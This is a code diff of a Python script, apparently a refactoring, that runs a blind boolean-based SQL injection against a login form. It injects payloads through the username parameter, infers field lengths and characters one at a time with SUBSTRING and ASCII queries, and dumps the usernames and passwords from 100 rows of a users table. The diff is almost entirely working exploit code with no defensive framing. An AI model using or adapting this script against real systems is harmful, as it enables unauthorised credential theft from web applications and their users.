@@ -13,18 +13,22 @@ def is_success(username_payload, password="x"):
         "p": password
     })
 
-    with urllib.request.urlopen("{}?{}".format(BASE_URL, query)) as response:
-        html = response.read().decode()
+    url = "{}?{}".format(BASE_URL, query)
+
+    response = urllib.request.urlopen(url)
+    html = response.read().decode("utf-8")
+    response.close()
 
     return SUCCESS_MARKER in html
 
 
 def find_length(row, field, max_length=200):
     for length in range(1, max_length):
+
         payload = (
-            f'" OR (SELECT LENGTH({field}) '
-            f'FROM users LIMIT 1 OFFSET {row})={length} -- '
-        )
+            '" OR (SELECT LENGTH({}) '
+            'FROM users LIMIT 1 OFFSET {})={} -- '
+        ).format(field, row, length)
 
         if is_success(payload):
             return length
@@ -34,10 +38,11 @@ def find_length(row, field, max_length=200):
 
 def find_char(row, field, position):
     for char in CHARSET:
+
         payload = (
-            f'" OR (SELECT ASCII(SUBSTRING({field},{position},1)) '
-            f'FROM users LIMIT 1 OFFSET {row})={ord(char)} -- '
-        )
+            '" OR (SELECT ASCII(SUBSTRING({},{},1)) '
+            'FROM users LIMIT 1 OFFSET {})={} -- '
+        ).format(field, position, row, ord(char))
 
         if is_success(payload):
             return char
@@ -48,18 +53,21 @@ def find_char(row, field, position):
 def extract_value(row, field):
     length = find_length(row, field)
 
-    return "".join(
-        find_char(row, field, pos)
-        for pos in range(1, length + 1)
-    )
+    value = ""
+
+    for pos in range(1, length + 1):
+        value += find_char(row, field, pos)
+
+    return value
 
 
 results = []
 
 for row in range(100):
+
     username = extract_value(row, "username")
     password = extract_value(row, "password")
 
     results.append((username, password))
 
-    print(f"Row {row}: {username} / {password}")
+    print("Row {}: {} / {}".format(row, username, password))
